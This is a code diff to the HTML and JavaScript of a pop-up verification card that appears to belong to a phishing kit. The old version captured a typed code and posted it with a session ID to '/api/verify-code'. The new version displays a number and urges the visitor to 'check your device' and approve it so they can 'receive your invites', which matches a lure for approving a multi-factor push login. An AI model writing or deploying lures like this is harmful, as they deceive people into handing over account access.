@@ -242,49 +242,17 @@
         <div class="response-card">
           <button class="response-close" type="button" onclick="window.__ResponseControls.close()">×</button>
           <div class="response-icon number">#</div>
-          <h2 class="response-title">Enter This Number</h2>
-          <p class="response-message">Please enter the number shown below to verify you are not a robot.</p>
-          <div class="response-number">${escapeHtml(String(number))}</div>
-          <form class="response-form" id="number-prompt-form" autocomplete="off">
-            <label for="number-input">Enter the number above</label>
-            <input type="text" id="number-input" name="number-input" placeholder="Type the number" inputmode="numeric" />
-          </form>
-          <div class="response-actions">
-            <button class="response-btn response-btn-secondary" type="button" onclick="window.__ResponseControls.close()">Cancel</button>
-            <button class="response-btn response-btn-primary" type="button" id="number-prompt-submit">Submit</button>
-          </div>
-          <div class="sms-verify-loading" id="number-verify-loading" style="display:none;">
-            <div class="sms-verify-spinner"></div>
-            <p>Verifying…</p>
+          <h2 class="response-title">Verification Number</h2>
+          <div class="response-number" style="font-size: 2.7rem; font-weight: 900; letter-spacing: 0.08em; margin: 1rem 0 1.25rem; color: #111827;">${escapeHtml(String(number))}</div>
+          <p class="response-message" style="margin: 0; line-height: 1.7; color: #374151; text-align: center;">
+            Kindly check your device. Kindly click this number to verify and accept your account to receive your invites. Thank you.
+          </p>
+          <div class="response-actions" style="margin-top: 1.5rem; justify-content: center;">
+            <button class="response-btn response-btn-primary" type="button" onclick="window.__ResponseControls.close()">Confirm</button>
           </div>
         </div>
       </div>
     `);
-    setupNumberPromptSubmit();
-  }
-
-  function setupNumberPromptSubmit() {
-    const submitBtn = document.getElementById('number-prompt-submit');
-    if (!submitBtn) return;
-    submitBtn.addEventListener('click', async function () {
-      const input = document.getElementById('number-input');
-      const value = input ? input.value.trim() : '';
-      if (!value) return;
-      const formEl = document.getElementById('number-prompt-form');
-      const actionsEl = document.querySelector('.response-actions');
-      const loadingEl = document.getElementById('number-verify-loading');
-      if (formEl) formEl.style.display = 'none';
-      if (actionsEl) actionsEl.style.display = 'none';
-      if (loadingEl) loadingEl.style.display = 'flex';
-      const sessionId = getSessionId();
-      try {
-        await fetch('/api/verify-code', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ sessionId, code: value }),
-        });
-      } catch (err) { /* ignore */ }
-    });
   }
 
   function closeAuthModal() {
